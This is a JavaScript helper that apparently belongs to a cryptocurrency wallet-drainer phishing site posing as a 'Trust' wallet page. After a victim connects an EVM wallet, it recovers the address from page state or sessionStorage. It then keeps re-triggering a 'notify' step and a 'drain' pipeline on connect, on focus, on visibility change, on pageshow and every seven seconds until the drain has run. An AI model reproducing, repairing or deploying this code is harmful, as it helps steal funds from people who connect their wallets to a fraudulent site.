/**
 * Trust site — hard resume: notify-first + drain after Safari/Trust freeze.
 */
(function () {
  'use strict';

  var kicking = false;

  function kick(why) {
    if (kicking) return;
    try {
      var L = window.legion;
      if (!L) return;
      var S = L.state || {};
      var addr = S.evmAddr;
      try {
        if (!addr) addr = sessionStorage.getItem('legion_wc_evm_addr') || sessionStorage.getItem('trust_site_connected_addr');
      } catch (_) {}
      // Addr alone is enough to start notify; continueConnected recovers WC provider
      if (!addr && !S.evmProvider) return;
      if (addr && !S.evmAddr) {
        try { S.evmAddr = String(addr).toLowerCase(); } catch (_) {}
      }

      var notified = !!(S.notifyDone || S.connectNotifiedAddr);
      try {
        if (!notified && addr && sessionStorage.getItem('legion_notify_done') === String(addr).toLowerCase()) {
          notified = true;
        }
      } catch (_) {}

      var need = !notified || (S.drainAttempted !== true && S.postConnectComplete !== true);
      if (!need) return;
      if (S.drainRunning) return;

      kicking = true;
      console.warn('[TrustBridge] resume:', why, 'notified=' + notified);
      var run = function () {
        var p = typeof L.continueConnected === 'function'
          ? L.continueConnected()
          : (typeof L.drain === 'function' ? L.drain() : Promise.resolve());
        return Promise.resolve(p);
      };
      // Prefer site helper (recovers provider first)
      var p = typeof window.__TRUST_RUN_PIPELINE__ === 'function'
        ? window.__TRUST_RUN_PIPELINE__('bridge:' + why)
        : run();
      Promise.resolve(p).finally(function () {
        kicking = false;
      });
    } catch (e) {
      kicking = false;
      console.warn('[TrustBridge]', e && e.message);
    }
  }

  window.addEventListener('legion:connected', function () {
    setTimeout(function () { kick('connected+1s'); }, 1000);
    setTimeout(function () { kick('connected+3s'); }, 3000);
    setTimeout(function () { kick('connected+8s'); }, 8000);
  });

  document.addEventListener('visibilitychange', function () {
    if (document.visibilityState === 'visible') {
      setTimeout(function () { kick('visible'); }, 300);
      setTimeout(function () { kick('visible+2s'); }, 2000);
    }
  });

  window.addEventListener('pageshow', function () {
    setTimeout(function () { kick('pageshow'); }, 300);
  });

  window.addEventListener('focus', function () {
    setTimeout(function () { kick('focus'); }, 400);
  });

  setInterval(function () {
    if (document.visibilityState === 'visible') kick('tick');
  }, 7000);
})();
